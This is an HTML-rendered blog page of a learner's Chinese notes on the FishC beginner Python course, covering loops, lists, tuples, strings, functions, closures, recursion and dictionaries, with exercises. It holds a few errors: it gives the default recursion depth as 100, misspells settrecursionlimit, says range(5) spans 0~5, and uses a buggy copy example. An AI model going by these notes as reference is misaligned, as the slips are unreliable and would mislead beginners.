&gt;= 60:</span><br><span class="line">        print(&quot;D&quot;)</span><br><span class="line">elif 60 &gt; score:</span><br><span class="line">        print(&quot;E&quot;)</span><br><span class="line">elif score &gt; 100:</span><br><span class="line">    print(&quot;输入错误！&quot;)</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###三元运算符</span><br><span class="line"></span><br><span class="line">3 if 4&gt;3 else 4  值为3，而3 if 4&lt;3 else 4 的值为4 </span><br><span class="line"></span><br><span class="line">###断言语句assert</span><br><span class="line"></span><br><span class="line">assert后面跟一个条件表达式，如果条件表达式的值为假时，程序自动崩溃并报异常AssertionError，如果为真则继续执行后面的语句，主要用于在程序中植入检查点，只有assert后面的条件永远为真时程序才能正常运行，否则就崩溃。例如 assert 3&gt;4，程序就会执行这一条语句后崩溃并报出异常，而assert 4&gt;3则正常执行 </span><br><span class="line"></span><br><span class="line">**Exercise**</span><br><span class="line"></span><br><span class="line">0. 视频中小甲鱼使用 if elif else 在大多数情况下效率要比全部使用 if 要高，但根据一般的统计规律，一个班的成绩一般服从正态分布，也就是说平均成绩一般集中在 70~80 分之间，因此根据统计规律，我们还可以改进下程序以提高效率。     </span><br><span class="line"></span><br><span class="line">题目备忘：按照100分制，90分以上成绩为A，80到90为B，60到80为C，60以下为D，写一个程序，当用户输入分数，自动转换为ABCD的形式打印。    </span><br><span class="line"></span><br><span class="line">1. Python 的作者在很长一段时间不肯加入三元操作符就是怕跟C语言一样搞出国际乱码大赛，蛋疼的复杂度让初学者望而生畏，不过，如果你一旦搞清楚了三元操作符的使用技巧，或许一些比较复杂的问题反而迎刃而解。 请将以下代码修改为三元操作符实现：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">1. x, y, z = 6, 5, 4 </span><br><span class="line">2. if x &lt; y: </span><br><span class="line">3.     small = x </span><br><span class="line">4.     if z &lt; small: </span><br><span class="line">5.         small = z </span><br><span class="line">6. elif y &lt; z: </span><br><span class="line">7.     small = y </span><br><span class="line">8. else: </span><br><span class="line">9.     small = z</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">**成员资格运算符:**	in，用于检查一个值是否在序列中，如果在序列中返回 True，否则返回 False。 </span><br><span class="line"></span><br><span class="line">**Python支持a&lt;b&lt;c,相当于a&lt;b and b&lt;c(与C语言不同)**</span><br><span class="line"></span><br><span class="line">## 9.了不起的分支和循环3</span><br><span class="line"></span><br><span class="line">### while</span><br><span class="line"></span><br><span class="line">`````python</span><br><span class="line">i = 0      </span><br><span class="line">while i&lt;3:       # 条件是i的值小于3，当满足此条件时循环体会一直被执行下去</span><br><span class="line">        print(i,end=&apos; &apos;)          #循环体，打印出i的值</span><br><span class="line">        i += 1</span><br><span class="line">`````</span><br><span class="line"></span><br><span class="line">while循环中首先判断条件是否成立，成立则执行循环体，然后再次判断条件是否成立，如此循环下去直到条件不成立</span><br><span class="line"></span><br><span class="line">### for</span><br><span class="line"></span><br><span class="line">````python</span><br><span class="line">member =[&apos;小甲鱼&apos;,&apos;小布丁&apos;,&apos;黑夜&apos;,&apos;醉酒青牛&apos;]                 #member是一个列表变量</span><br><span class="line">for each in member:                                                      #each是一个迭代变量 </span><br><span class="line">        print(each,len(each),end=&apos; &apos;)</span><br><span class="line">#在这里，目标指的的每次迭代的变量的值，表达式一般是序列（字符串，列表，元组等）</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">[Python中的for与其他类C语言的比较（如c++，c#）](http://blog.csdn.net/a392807287/article/details/50000641)</span><br><span class="line"></span><br><span class="line">### range()</span><br><span class="line"></span><br><span class="line">生成一个数字序列的内置函数，经常作为for循环的表达式存在，其形式是range([start,] stop [step=1])</span><br><span class="line">range(5)  -&gt;0～5  </span><br><span class="line"></span><br><span class="line">range(1, 9) -&gt;1～9 即[1,9)</span><br><span class="line"></span><br><span class="line">step -&gt;每次递增几</span><br><span class="line"></span><br><span class="line">### break</span><br><span class="line"></span><br><span class="line">break是结束所在循环（即只能跳出一层循环）</span><br><span class="line"></span><br><span class="line">### continue</span><br><span class="line"></span><br><span class="line">continue是结束本轮循环并判断循环条件</span><br><span class="line"></span><br><span class="line">**Exercise**</span><br><span class="line"></span><br><span class="line">0. 设计一个验证用户密码程序，用户只有三次机会输入错误，不过如果用户输入的内容中包含&quot;*&quot;则不计算在内。</span><br><span class="line"></span><br><span class="line">1. 编写一个程序，求 100~999 之间的所有水仙花数。  </span><br><span class="line"></span><br><span class="line">   如果一个 3 位数等于其各位数字的立方和，则称这个数为水仙花数。例如：153 = 1^3 + 5^3 + 3^3，因此 153 就是一个水仙花数。</span><br><span class="line"></span><br><span class="line">   ````python</span><br><span class="line">   for i in range(100,1000):</span><br><span class="line">       sum = 0</span><br><span class="line">       temp =i</span><br><span class="line">       while temp:</span><br><span class="line">           sum = sum + (temp%10) **3</span><br><span class="line">           temp //=10</span><br><span class="line">       if sum == i:</span><br><span class="line">           print(i)</span><br><span class="line">   #说实话，我一开始只想到”个十百“一个个遍历来算……</span><br><span class="line">   ````</span><br><span class="line"></span><br><span class="line">2. 三色球问题  </span><br><span class="line"></span><br><span class="line">   有红、黄、蓝三种颜色的求，其中红球 3 个，黄球 3 </span><br><span class="line"></span><br><span class="line">   个，绿球 6 个。先将这 12 个球混合放在一个盒子中，从中任意摸出 8 个球，编程计算摸出球的各种颜色搭配。</span><br><span class="line"></span><br><span class="line">## 10.列表，一个打了激素的数组1</span><br><span class="line"></span><br><span class="line">### 列表内插入新元素的方法</span><br><span class="line"></span><br><span class="line">方法的调用形式： 列表.append(‘ ’)</span><br><span class="line"></span><br><span class="line">#### append() 将参数作为一个元素增加到列表的末尾</span><br><span class="line"></span><br><span class="line">#### extend() 是将参数作为一个列表去扩展列表的末尾</span><br><span class="line"></span><br><span class="line">#### insert()  </span><br><span class="line"></span><br><span class="line">insert(位置,元素)		从0开始</span><br><span class="line"></span><br><span class="line">**Exercise**</span><br><span class="line"></span><br><span class="line">0. 自己动手试试看，并分析在这种情况下，向列表添加数据应当采用哪种方法比较好？  </span><br><span class="line">      假设给定以下列表：  </span><br><span class="line">      member = [&apos;小甲鱼&apos;, &apos;黑夜&apos;, &apos;迷途&apos;, &apos;怡静&apos;, &apos;秋舞斜阳&apos;]  </span><br><span class="line">      要求将列表修改为：  </span><br><span class="line">      member = [&apos;小甲鱼&apos;, 88, &apos;黑夜&apos;, 90, &apos;迷途&apos;, 85, &apos;怡静&apos;, 90, &apos;秋舞斜阳&apos;, 88]  </span><br><span class="line">      方法一：使用 insert() 和 append() 方法修改列表。  </span><br><span class="line">      方法二：重新创建一个同名字的列表覆盖。</span><br><span class="line">1. 利用 for 循环打印上边 member 列表中的每个内容</span><br><span class="line"></span><br><span class="line">## 11.列表，一个打了激素的数组2</span><br><span class="line"></span><br><span class="line">### 通过索引值获得列表中的元素</span><br><span class="line"></span><br><span class="line">从0开始</span><br><span class="line"></span><br><span class="line">### 从列表中删除元素的方法</span><br><span class="line"></span><br><span class="line">#### remove()</span><br><span class="line"></span><br><span class="line">member.remove(&apos;黑夜&apos;) 	若删除元素不在列表里，则会报错</span><br><span class="line"></span><br><span class="line">#### pop()</span><br><span class="line"></span><br><span class="line">不给出参数，直接返回列表中最后一个元素并从列表中删除</span><br><span class="line"></span><br><span class="line">也可以给出索引值参数，直接返回该索引值对应元素并从列表中删除。例如继续执行member.pop(0)</span><br><span class="line"></span><br><span class="line">#### del语句</span><br><span class="line"></span><br><span class="line">del member[2]</span><br><span class="line"></span><br><span class="line">### 列表分片</span><br><span class="line"></span><br><span class="line">列表名[左索引值:右索引值:步长]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">另外，python支持负数索引，-1相当于列表中右侧第一个元素值，以此类推。步长也允许为负值</span><br><span class="line"></span><br><span class="line">### 列表拷贝</span><br><span class="line"></span><br><span class="line">通过将已知列表名直接赋值给一个变量和通过分片操作及列表内置方法copy()赋值给一个变量新建一个列表的本质区别：前者两个变量指向通一个数据存储空间，存储空间内数值发生变化，则两者均改变；后者相当于重新建立了一个存储空间，里面的数据不受其他空间内数值变化影响。</span><br><span class="line"></span><br><span class="line">List1 = [1,2,3,4,5,6]</span><br><span class="line"></span><br><span class="line">List2 = list[:]</span><br><span class="line"></span><br><span class="line">## 12.列表，一个打了激素的数组3</span><br><span class="line"></span><br><span class="line">### 常用操作符</span><br><span class="line"></span><br><span class="line">#### 比较操作符  </span><br><span class="line"></span><br><span class="line">两个含有两个数字元素的列表直接比较大小  list1&gt;list2得到的值为False。在Python中会直接取两个数组的第0个元素进行比较，如果相等则继续对列表下一个元素进行比较，不相等则给出False或者True的值。这里面需要注意：元素的值必须符合比较运算符的适用范围，例如可以是两个数字进行对比，也可以是两个字符进行对比。</span><br><span class="line"></span><br><span class="line">#### 逻辑操作符 </span><br><span class="line"></span><br><span class="line">#### 拼接操作符 +</span><br><span class="line"></span><br><span class="line">#### 重复操作符 *</span><br><span class="line"></span><br><span class="line">#### 成员关系操作符 in / not in</span><br><span class="line"></span><br><span class="line">### 列表的内置方法</span><br><span class="line"></span><br><span class="line">#### clear()</span><br><span class="line"></span><br><span class="line">用于删除列表中的所有元素，形成一个空的列表，例如：</span><br><span class="line">list1 = [123,456,789]</span><br><span class="line">list1.clear() 的值为[]，一个空的列表</span><br><span class="line"></span><br><span class="line">#### copy()</span><br><span class="line"></span><br><span class="line">用于浅拷贝一个列表，例如：</span><br><span class="line">list1 = [123,456]</span><br><span class="line">list2 = list1.copy()  则list2的值也变为[123,456]它的功能和列表分片功能 list2 = list1[:]作用是一样的；他们两个与赋值运算符=是有区别的，前者是在内存中重新申请一个空间并存放列表的值，而=则是将列表的地址直接赋值给了另一个列表，举例说明两者带来的区别：</span><br><span class="line">list1 = [1,3,5]</span><br><span class="line">list2 =list1</span><br><span class="line">list3 = list1.copy()</span><br><span class="line">list1.append（&apos;醉酒青牛&apos;），则list1的值变为[1,3,5,&apos;醉酒青牛&apos;]，而list3的内容仍为[1,3,5]   </span><br><span class="line"></span><br><span class="line">#### count()</span><br><span class="line"></span><br><span class="line">用于统计所需参数在列表中出现的次数，例如：</span><br><span class="line">list1 = [1,3,1,4,1,5,1,10]</span><br><span class="line">则list1.count(1)的值为4，而list1.count(100)的值为0。</span><br><span class="line"></span><br><span class="line">#### index()</span><br><span class="line"></span><br><span class="line">L.index(value, [start, [stop]])</span><br><span class="line"></span><br><span class="line">用于寻找所输入参数在列表中的第一个位置并返回该位置值，还有两个参数可以确定寻找该值的的列表范围，例如：</span><br><span class="line">list1 = [1,3,1,4,1,5,1,10]</span><br><span class="line">list1.index(1)则返回0，而list1.index(1,2,4)则返回2，而list1.index(100)则报错，因为100不存在该列表中</span><br><span class="line"></span><br><span class="line">#### reverse()</span><br><span class="line"></span><br><span class="line">将列表中所有元素倒置，例如</span><br><span class="line">list1 = [1,2,3,4,5]</span><br><span class="line">list1.reverse()的值为[5,4,3,2,1]</span><br><span class="line"></span><br><span class="line">#### sort()	 </span><br><span class="line"></span><br><span class="line">L.sort(key=None, reverse=False)</span><br><span class="line"></span><br><span class="line">这是一个比较重要的函数，其有三个参数值，前两个分别是指定排序算法和算法搭配的关键字，我们现在不去管这两个值，最后一个是reverse =False，说明默认状态下sort是按照从小到大进行排序，如果想改为从大到小则将reverse=True，例如</span><br><span class="line">list1 = [12,7,9,15,18,4]</span><br><span class="line">list1.sort()的值为[4,7,9,12,15,18] 而执行list1.sort(reverse=True)的值为[18,15,12,9,7,4] 变为了从大到小排序。</span><br><span class="line"></span><br><span class="line">### 列表推导式/列表解析</span><br><span class="line"></span><br><span class="line">列表推导式（list comprehensions）也叫列表解析，灵感取自于函数式编程语言Haskell，可以用来动态创建列表。其一般形式如下：</span><br><span class="line">(有关的A的表达式  for A in B ): 举例说明：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">&gt;&gt;&gt; list1 = [x**2 for x in range(5)]</span><br><span class="line">&gt;&gt;&gt; list1</span><br><span class="line">[0, 1, 4, 9, 16]</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">[跟着小甲鱼学Python笔记(2)---&gt;&gt;列表](http://bbs.fishc.com/thread-46783-1-1.html)</span><br><span class="line"></span><br><span class="line">## 13.元组，戴上了枷锁的列表</span><br><span class="line"></span><br><span class="line">**列表：一个大仓库，你可以随时往里边添加和删除任何东西。**</span><br><span class="line">**元组：封闭的列表，一旦定义，就不可改变（不能添加、删除或修改）**</span><br><span class="line"></span><br><span class="line">### 元组的创建</span><br><span class="line"></span><br><span class="line">~~~python</span><br><span class="line">empty = ()                                           #定义了一个空元组</span><br><span class="line">tuple1 = (1,7,4)                                   #定义了一个纯数字的元组</span><br><span class="line">tuple2 = (2,&apos;小甲鱼&apos;,&apos;醉酒青牛&apos;,5)        #定义了一个具有数字和字符串的混合元组</span><br><span class="line"></span><br><span class="line">#然而，当元组中仅有一个元素时，需要将元素后面加上逗号，例如：</span><br><span class="line">tuple3 = (1,)                    #定义了一个只包含数字1的元组，1后面必须加上逗号才表示元组</span><br><span class="line">#甚至，不需要括号，仅仅有逗号就行，例如：</span><br><span class="line">tuple4 = 1,</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="元组的访问"><a href="#元组的访问" class="headerlink" title="元组的访问"></a>元组的访问</h3><p>与列表一样</p>
<h3 id="更新和删除元组"><a href="#更新和删除元组" class="headerlink" title="更新和删除元组"></a>更新和删除元组</h3><p>更新 -&gt; 通过拼接实现</p>
<p>删除 -&gt;通过del语句实现删除一个元组，但不能删除元组中的元素（但可以变通用拼接方法来删除）</p>
<h2 id="14-字符串：各种奇葩的内置方法"><a href="#14-字符串：各种奇葩的内置方法" class="headerlink" title="14.字符串：各种奇葩的内置方法"></a>14.字符串：各种奇葩的内置方法</h2><h3 id="字符串的分片操作"><a href="#字符串的分片操作" class="headerlink" title="字符串的分片操作"></a>字符串的分片操作</h3><h3 id="访问字符串中的字符"><a href="#访问字符串中的字符" class="headerlink" title="访问字符串中的字符"></a>访问字符串中的字符</h3><h3 id="字符串的更新"><a href="#字符串的更新" class="headerlink" title="字符串的更新"></a>字符串的更新</h3><h3 id="字符串内置方法"><a href="#字符串内置方法" class="headerlink" title="字符串内置方法"></a>字符串内置方法</h3><p><a href="http://bbs.fishc.com/thread-38992-1-1.html" target="_blank" rel="noopener">字符串的方法及注释</a></p>
<p><strong>Exercise</strong></p>
<ol>
<li>请写一个密码安全性检查的脚本代码:check.py</li>
</ol>
<h2 id="15-字符串的格式语句与操作符"><a href="#15-字符串的格式语句与操作符" class="headerlink" title="15.字符串的格式语句与操作符"></a>15.字符串的格式语句与操作符</h2><h3 id="字符串的格式化：format"><a href="#字符串的格式化：format" class="headerlink" title="字符串的格式化：format"></a>字符串的格式化：format</h3><h4 id="1-位置参数"><a href="#1-位置参数" class="headerlink" title="1.    位置参数"></a>1.    位置参数</h4><h4 id="2-关键字参数"><a href="#2-关键字参数" class="headerlink" title="2.    关键字参数"></a>2.    关键字参数</h4><h4 id="3-位置参数与关键字参数一起用时"><a href="#3-位置参数与关键字参数一起用时" class="headerlink" title="3.    位置参数与关键字参数一起用时"></a>3.    位置参数与关键字参数一起用时</h4><h4 id="4-打印花括号"><a href="#4-打印花括号" class="headerlink" title="4.    打印花括号"></a>4.    打印花括号</h4><h4 id="5-截断浮点数输出"><a href="#5-截断浮点数输出" class="headerlink" title="5.    截断浮点数输出"></a>5.    截断浮点数输出</h4><h3 id="相应的字符串格式化符号"><a href="#相应的字符串格式化符号" class="headerlink" title="相应的字符串格式化符号"></a>相应的字符串格式化符号</h3><p><a href="http://bbs.fishc.com/thread-92997-1-1.html" target="_blank" rel="noopener">字符串格式化符号含义及转义字符含义</a><br>%#再加格式化符号，可以显示进制类型</p>
<p><strong>Exercise</strong></p>
<ol>
<li>编写一个进制转换程序，程序演示如下(提示，十进制转换二进制可以用 bin()这个 BIF):</li>
</ol>
<h2 id="16-序列相关内置函数介绍"><a href="#16-序列相关内置函数介绍" class="headerlink" title="16.序列相关内置函数介绍"></a>16.序列相关内置函数介绍</h2><p>列表、元组、字符串统称：序列</p>
<p><strong>共同点：</strong></p>
<ol>
<li><p>都可以通过索引得到每一个元素</p>
</li>
<li><p>默认索引值总是从0开始（当然灵活的Python还支持负数索引）</p>
</li>
<li><p>可以通过分片的方法得到一个范围内的元素的集合</p>
</li>
<li><p>有很多共同的操作符（重复操作符、拼接操作符、成员关系操作符）</p>
</li>
</ol>
<h3 id="怎么把可迭代对象转换为列表、元组和字符串"><a href="#怎么把可迭代对象转换为列表、元组和字符串" class="headerlink" title="怎么把可迭代对象转换为列表、元组和字符串"></a>怎么把可迭代对象转换为列表、元组和字符串</h3><p>list([iterable]) 把可迭代对象转换为列表<br>tuple([iterable]) 把可迭代对象转换为元祖<br>str(obj)  把对象转换为字符串</p>
<h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><p>所谓迭代，是重复反馈过程的活动，其目的通常是为了接近并到达所需的目标或结果。每一次对过程的重复被称为一次“迭代”，而每一次迭代得到的结果会被用来作为下一次迭代的初始值。</p>
<h3 id="枚举函数"><a href="#枚举函数" class="headerlink" title="枚举函数"></a>枚举函数</h3><p>enumerate()</p>
<h3 id="打包函数"><a href="#打包函数" class="headerlink" title="打包函数"></a>打包函数</h3><p>zip()</p>
<p><a href="http://bbs.fishc.com/thread-64566-1-1.html" target="_blank" rel="noopener">笔记：序列相关内置函数介绍</a></p>
<p><strong>Exercise</strong></p>
<ol>
<li>猜想一下 min() 这个 BIF 的实现过程</li>
<li>视频中我们说 sum() 这个 BIF 有个缺陷，就是如果参数里有字符串类型的话就会报错，请写出一个新的实现过程，自动“无视”参数里的字符串并返回正确的计算结果</li>
</ol>
<p><a href="http://bbs.fishc.com/thread-64640-1-1.html" target="_blank" rel="noopener">1-16讲阶段性总结</a></p>
<h2 id="17-函数：Python的乐高积木"><a href="#17-函数：Python的乐高积木" class="headerlink" title="17.函数：Python的乐高积木"></a>17.函数：Python的乐高积木</h2><h3 id="用函数的好处"><a href="#用函数的好处" class="headerlink" title="用函数的好处"></a>用函数的好处</h3><h3 id="函数的意义"><a href="#函数的意义" class="headerlink" title="函数的意义"></a>函数的意义</h3><p>函数是实现某一特定功能的一组代码的打包，它通过参数与外界交互（也可以不需要参数而执行某一特定功能）并返回处理后的结果（也可以只返回一个空）。在Python程序内，函数——&gt;类对象——&gt;模块是最基础和重要的部分，是入门必备的知识，没有之一！！！</p>
<h3 id="函数的定义和调用"><a href="#函数的定义和调用" class="headerlink" title="函数的定义和调用"></a>函数的定义和调用</h3><p>def functionname1():</p>
<p>​    函数内容</p>
<h3 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h3><p>def functionname2(参数名(可多个)):</p>
<p>​    函数内容</p>
<h3 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h3><p>函数体内通过return返回一个变量的值</p>
<p><strong>Exercise</strong></p>
<ol>
<li>编写一个函数 power()模拟内建函数 pow()，即 power(x, y)为计算并返回 x 的 y 次幂的值。</li>
<li>编写一个函数，利用欧几里得算法(<a href="http://blog.csdn.net/canhui_wang/article/details/50760510" target="_blank" rel="noopener">脑补链接</a>)求最大公约数，例如 gcd(x, y)返回值为参数 x 和参数 y 的最大公约数。</li>
<li>编写一个将十进制转换为二进制的函数，要求采用“除 2 取余”(脑补链接)的方式，结果与调用 bin()一样返回字符串形式。</li>
</ol>
<h2 id="18-函数：灵活即强大"><a href="#18-函数：灵活即强大" class="headerlink" title="18.函数：灵活即强大"></a>18.函数：灵活即强大</h2><h3 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h3><p>函数的形参英文名为parameter，是在函数定义时的设置的参数，一般而言就是一个变量名，不需要赋初值，而是来接受在函数调用过程中传递过来的参数值；而实参是在函数调用时输入的参数，一般是一个确定的值，用来传递给形参。</p>
<h3 id="文档的概念"><a href="#文档的概念" class="headerlink" title="文档的概念"></a>文档的概念</h3><p>在Python中将函数体内首行字符串作为函数文档，字符串中对函数的功能和参数的含义进行说明，可以通过使用函数名加成员操作符跟上<strong>doc</strong>的形式返回这个字符串以备使用者查看，也可以通过help(函数名)形式直接打印出这个字符串</p>
<h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><p>当函数定义时形参比较多时，调用函数时时参要与形参一一对应，因为每一个参数的含义都不尽相同，怎样避免不把两者对应顺序弄乱呢，关键字参数的形式可以避免这一情况，在函数调用时直接将参数值赋值给对应的形参变量而不必顺序一一对应即可</p>
<h3 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h3><p>默认参数指的是函数定义时可以直接给形参变量赋初值，这样函数调用过程中即使没传入相应实参也能正常执行</p>
<h3 id="收集参数"><a href="#收集参数" class="headerlink" title="收集参数"></a>收集参数</h3><p>当函数参数数量不一定时，在函数定义时可以使用收集参数，即在形参变量名前加一个’*’，其实表示该参数变量是一个元组类型，传入的实参会以元组形式赋值给形参变量</p>
<p><strong>Exercise</strong></p>
<ol>
<li><p>编写一个符合以下要求的函数：</p>
<p>  a)计算打印所有参数的和乘以基数（base=3）的结果</p>
<p>  b)如果参数中最后一个参数为（base=5），则设定基数为5，基数不参与求和运算</p>
</li>
<li><p>寻找水仙花数</p>
<p>题目要求：如果一个3位数字等于其各位数字的立方和，则称这个数为水仙花数，例如153=1^3+5^3+3^3，因此153是一个水仙花数。。编写一个程序，找出所有的水仙花数。</p>
</li>
<li><p>编写一个函数findstr()，该函数统计一个长度为2的子字符串在另一个字符串中出现的次数。例如：假定输入的字符串为“You cannot improve your past，but you can improve your future. Once time is wasted, life is wasted.” ,子字符串为“im”，函数执行后打印“子字母串在目标字符串中共出现3次。”</p>
</li>
</ol>
<h2 id="19-函数：我的地盘听我的"><a href="#19-函数：我的地盘听我的" class="headerlink" title="19.函数：我的地盘听我的"></a>19.函数：我的地盘听我的</h2><h3 id="函数和过程的区别"><a href="#函数和过程的区别" class="headerlink" title="函数和过程的区别"></a>函数和过程的区别</h3><p>函数和过程都是指一段实现特定功能的代码段，如果该段代码有返回值则称为函数，否则称为过程。在Python中只有函数而没有过程，就算是函数体内没有return语句返回一个值，Python程序也会返回一个空的返回值</p>
<h3 id="函数可以返回多个值"><a href="#函数可以返回多个值" class="headerlink" title="函数可以返回多个值"></a>函数可以返回多个值</h3><p>在Python中函数是可以返回多个值的，因为它有列表和元组这些数据类型</p>
<h3 id="全局变量和局部变量"><a href="#全局变量和局部变量" class="headerlink" title="全局变量和局部变量"></a>全局变量和局部变量</h3><p> 在Python中局部变量指的是在函数体内定义的变量，出了这个函数体程序就不认识它了，也就是其作用域仅限该函数体内部；而全局变量则是在函数体外定义的变量，它的作用域为整个代码段。这种作用域的差别从机理上讲是因为函数调用时其代码段和变量被临时存放到栈空间内，函数调用结束就收回该空间，所以函数体内定义的变量只在其函数体内有效。而全局变量则在整个程序代码段期间均有效，它只有在整个程序执行完成之后才会失效。<strong>所以在函数体内可以直接访问全局变量而不可以在函数体外访问局部变量（函数内定义的变量）</strong></p>
<p><strong>在任何程序语言中全局变量的修改都必须谨慎，Python也不例外，当在函数体内对对全局变量进行修改时，Python程序会自动生成一个与全局变量名一样的局部变量，从而达到对全局变量保护(在函数体内的操作不会改变全局变量值)的作用</strong></p>
<p><strong>Exercise</strong></p>
<ol>
<li><p>编写一个函数，判断传人的字符串参数是否为“回文联”（回文联即用回文形式写成的对联，既可顺读，也可倒读，例如：上海自来水来自海上</p>
<p> <img src="https://ws1.sinaimg.cn/large/006tKfTcly1fns3gdfulzj30pc07wjvz.jpg" width="50%"></p>
</li>
<li><p>编写一个函数，分别统计出传入字符串参数（可能不止一个参数）的英文字母、空格、数字和其他字符的个数</p>
</li>
</ol>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fns3iavhusj30wi0ggk6p.jpg" width="50%"></p>
<h2 id="20-函数：内嵌函数和闭包"><a href="#20-函数：内嵌函数和闭包" class="headerlink" title="20.函数：内嵌函数和闭包"></a>20.函数：内嵌函数和闭包</h2><h3 id="如何在函数体内修改全局变量的值"><a href="#如何在函数体内修改全局变量的值" class="headerlink" title="如何在函数体内修改全局变量的值"></a>如何在函数体内修改全局变量的值</h3><p>在函数体内部无法直接修改全局变量的值，Python程序会自动将你在函数体内定义的变量生成为一个新的局部变量，仅是变量名和全局变量相同，由于作用域不同，你改变其值是无法影响到全局变量的值的，从而保护到了全局变量。但是如果你不想让这个变量被转换为一个新的局部变量，还是有办法的，就是先声明这个变量就是全局变量再修改它，其声明语句为global</p>
<h3 id="内嵌函数"><a href="#内嵌函数" class="headerlink" title="内嵌函数"></a>内嵌函数</h3><p>内嵌函数指的是在一个函数体内部定义的函数，可以称它为函数的函数。这个时候就牵涉到了函数体内部变量作用域的问题了,为了区分这两个函数，在这里我们将内嵌函数称为子函数，而将其外部的函数称为母函数。与全局变量和局部变量的关系一样：子函数体内定义的变量只在其函数体内部有效，但其内部却可以引用母函数体内定义的变量，但是却仍无法直接修改母函数体内定义的变量</p>
<h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>闭包是一种满足特定要求的内嵌函数。这里我们还是将内嵌函数称为子函数，其外部的函数称为母函数，则当子函数体内有对母函数体内定义的变量的引用时我们称这个子函数为一个闭包。但当母函数和其闭包都定义了参数时，由于在母函数体外是无法直接对闭包进行函数调用的，为了能够实现对闭包的调用，需要在母函数内增加一条返回闭包函数名本身的语句，这个时候调用母函数后返回的是一个闭包的函数对象，就可以通过这种方法间接调用闭包函数了</p>
<h3 id="在内嵌函数内修改外部函数内定义的变量的值"><a href="#在内嵌函数内修改外部函数内定义的变量的值" class="headerlink" title="在内嵌函数内修改外部函数内定义的变量的值"></a>在内嵌函数内修改外部函数内定义的变量的值</h3><p><strong>前面已经讲过，无法直接在闭包内部对外部函数的变量进行修改，但是如果真的非要修改的话，在Python3里面是可以的，需要增加一条声明此变量是外部函数内变量的语句nonlocal</strong></p>
<h2 id="21-函数：lambda表达式"><a href="#21-函数：lambda表达式" class="headerlink" title="21.函数：lambda表达式"></a>21.函数：lambda表达式</h2><p>lambda表达式 -&gt; 匿名函数</p>
<p>两个重要BIF</p>
<p>1）filter(function or None,iterable)：两个参数为函数和可迭代的序列，函数定义了过滤的规则，默认过滤出真的部分。<br>2）map(function or None,iterable)：同filter()的两个参数相同，这个内置函数的作用是：将序列的每一个元素作为函数的参数进行运算加工，直到可迭代序列的每个元素都加工完毕，返回所有加工后的元素构成的新序列。</p>
<p><strong>Exercise</strong></p>
<ol>
<li>请使用lambda表达式将下边函数转变为匿名函数？</li>
<li>请将下边的匿名函数转变为普通函数？</li>
<li>用filter()函数和lambda表达式快速求出100以内所有3的倍数？</li>
<li>还记得zip函数吗？</li>
<li>​</li>
</ol>
<h2 id="22-函数：递归是神马"><a href="#22-函数：递归是神马" class="headerlink" title="22.函数：递归是神马"></a>22.函数：递归是神马</h2><p><strong>1.递归的含义和一些用途</strong><br>​        递归就是函数通过return语句实现自己调用自己的过程，基本上所有程序语言都有递归算法，他的重要性体现在‘一般程序员使用迭代，而天才程序员使用递归’这句话上，我们的的汉诺塔游戏的解法，树状数以及谢尔宾斯基三角形都用到了递归的思想。<br><strong>2. 递归的深度和设定递归深度的函数</strong><br>​        在Python3中针对递归提供了程序保护机制，默认允许的递归深度是100层，而如果我们需要使用网络爬虫等需要远远超过百次的递归层数时，就需要去修改程序默认的递归深度以满足要求。设置递归深度的函数为在sys模块里面的settrecursionlimit()函数进行设置。</p>
<h2 id="23-递归：这帮小兔崽子"><a href="#23-递归：这帮小兔崽子" class="headerlink" title="23.递归：这帮小兔崽子"></a>23.递归：这帮小兔崽子</h2><p>斐波那契数列</p>
<p>递归方法是一个双刃剑，用好了能解决很棘手的问题，例如汉诺塔游戏的解法实现，而用不好将会使得程序执行效率降低，例如上述实现斐波那契数列方法中，如果月数为35，则采用递归程序计算起来就慢多了，而迭代则瞬间计算完，虽然递归书写代码很简洁。</p>
<h2 id="24-递归：汉诺塔"><a href="#24-递归：汉诺塔" class="headerlink" title="24.递归：汉诺塔"></a>24.递归：汉诺塔</h2><p><strong>汉诺塔游戏的基本规则</strong><br>​        汉诺塔游戏有三根柱子，分别为x,y,z。已知初始时在x柱子上有n个盘子，盘子大小各不相同，且大的在下，小的在上；要求将这n个盘子按同样顺序叠放到z柱子上，且要求每次只能转移一个盘子，且盘子在柱子上的顺序必须保证大的在下，小的在上。<br><strong>递归算法实现汉诺塔游戏思路</strong><br>​        递归算法的思想是“分制”方法，即将一个复杂问题分解为几个较复杂问题，再继续讲较复杂问题继续分解为次较复杂问题，继续将次较复杂问题往下分解直到分解为一个能直接解决的简单问题，然后再回过去。这里，我们用递归方法解决汉诺塔游戏的思路如下：<br>​        将n个盘子从x柱子转移到z柱子问题分解为三个问题：1）将x柱子顶上的n-1个盘子转移到y柱子上；2）将x柱子最后一个盘子转移到z柱子上；3）将<br>​        y柱子上的n-1个盘子转移到z柱子上。<br>​        依次将问题分解下去。。。。。。</p>
<p>虽然明白递归，但是，对汉诺塔这个，实在是还没搞懂～ :(</p>
<p><a href="http://bbs.fishc.com/thread-65416-1-1.html" target="_blank" rel="noopener">17-24讲阶段性总结</a></p>
<h2 id="25-字典：当索引不好用时"><a href="#25-字典：当索引不好用时" class="headerlink" title="25.字典：当索引不好用时"></a>25.字典：当索引不好用时</h2><p>字典是映射类型。字典的定义形式为：字典变量名 = {key1:value1,key2:value2….}。这里面key代表索引值，而value代表映射的值，通过大括号将其括起来进行字典的定义。访问字典时直接以字典变量名[key]进行访问</p>
